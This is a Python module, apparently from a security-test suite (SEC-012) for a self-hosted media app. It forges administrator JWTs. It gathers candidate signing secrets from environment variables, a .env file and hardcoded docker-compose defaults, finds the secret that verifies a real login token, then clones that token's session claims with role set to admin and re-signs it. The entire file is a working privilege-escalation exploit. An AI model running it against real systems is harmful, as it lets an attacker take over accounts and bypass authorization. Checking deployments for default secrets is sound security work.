# Human: JWT decode and re-sign helpers for SEC-012 post-setup escalation.
# Agent: stdlib only; READS login token claims; WRITES forged HS256 with role=admin.

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from typing import Any

# Human: Fallback secrets when .env is missing — includes docker-compose.yml inlined defaults.
# Agent: READ by resolve_jwt_secret_candidates; matched via jwt_signature_valid against login token.
COMPOSE_DEFAULT_JWT_SECRET = (
    "ownly-compose-local-dev-mediavault-jwt-secret-not-for-production"
)
DEFAULT_JWT_SECRET_CANDIDATES: tuple[str, ...] = (
    COMPOSE_DEFAULT_JWT_SECRET,
    "change-me-in-production",
    "dev-jwt-secret-change-me",
)


def decode_jwt_payload_unverified(token: str) -> dict[str, Any]:
    # Human: Parse JWT payload without signature check (for copying ver/sid/iat).
    # Agent: RETURNS {} when malformed; NEVER used for authorization decisions.
    parts = token.split(".")
    if len(parts) != 3:
        return {}
    segment = parts[1]
    pad = "=" * (-len(segment) % 4)
    try:
        raw = base64.urlsafe_b64decode(segment + pad)
        data = json.loads(raw.decode("utf-8"))
    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
        return {}
    return data if isinstance(data, dict) else {}


def sign_hs256_jwt(payload: dict[str, Any], jwt_secret: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = _b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(jwt_secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{_b64url(sig)}"


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def reissue_jwt_with_role(
    *,
    user_id: str,
    email: str,
    role: str,
    jwt_secret: str,
    source_token: str | None = None,
    ttl_hours: int = 24,
) -> str:
    # Human: Clone session claims from a legitimate token but overwrite role.
    # Agent: PRESERVES ver/sid/iat when present so auth_middleware session gates pass.
    base = decode_jwt_payload_unverified(source_token) if source_token else {}
    now = int(time.time())
    payload: dict[str, Any] = {
        "sub": user_id,
        "email": email,
        "role": role,
        "iat": int(base.get("iat", now)),
        "exp": int(base.get("exp", now + ttl_hours * 3600)),
        "ver": int(base.get("ver", 0)),
    }
    sid = base.get("sid")
    if isinstance(sid, str) and sid.strip():
        payload["sid"] = sid.strip()
    return sign_hs256_jwt(payload, jwt_secret)


def jwt_signature_valid(token: str, secret: str) -> bool:
    # Human: True when HS256 HMAC over header.payload matches the third JWT segment.
    # Agent: USED to pick JWT_SECRET that signed the subject login token before re-signing.
    parts = token.split(".")
    if len(parts) != 3 or not secret.strip():
        return False
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    try:
        pad = "=" * (-len(parts[2]) % 4)
        provided = base64.urlsafe_b64decode(parts[2] + pad)
    except (ValueError, UnicodeDecodeError):
        return False
    expected = hmac.new(secret.strip().encode(), signing_input, hashlib.sha256).digest()
    return hmac.compare_digest(expected, provided)


def match_jwt_secret_for_token(token: str, candidates: list[str]) -> str | None:
    # Human: Return the first candidate that verifies the bearer token from auth.login.
    # Agent: CALLS jwt_signature_valid; PREFERRED over blind forge attempts.
    for secret in candidates:
        if jwt_signature_valid(token, secret):
            return secret
    return None


def resolve_jwt_secret_candidates(
    explicit: str | None,
    *,
    try_dev_defaults: bool = True,
) -> list[str]:
    # Human: Build ordered unique list of secrets to try when forging admin JWTs.
    # Agent: READS SEC012_JWT_SECRET, JWT_SECRET env; APPENDS dev defaults when allowed.
    seen: set[str] = set()
    out: list[str] = []

    def add(secret: str | None) -> None:
        if not secret:
            return
        s = secret.strip()
        if not s or s in seen or s.upper() == "GENERATE_ME":
            return
        seen.add(s)
        out.append(s)

    add(explicit)
    add(__import__("os").environ.get("SEC012_JWT_SECRET"))
    add(__import__("os").environ.get("JWT_SECRET"))
    try:
        from .env_file import discover_env_file, parse_env_file

        dotenv = discover_env_file(None)
        if dotenv is not None:
            add(parse_env_file(dotenv, keys=frozenset({"JWT_SECRET"})).get("JWT_SECRET"))
    except OSError:
        pass
    if try_dev_defaults:
        for candidate in DEFAULT_JWT_SECRET_CANDIDATES:
            add(candidate)
    return out
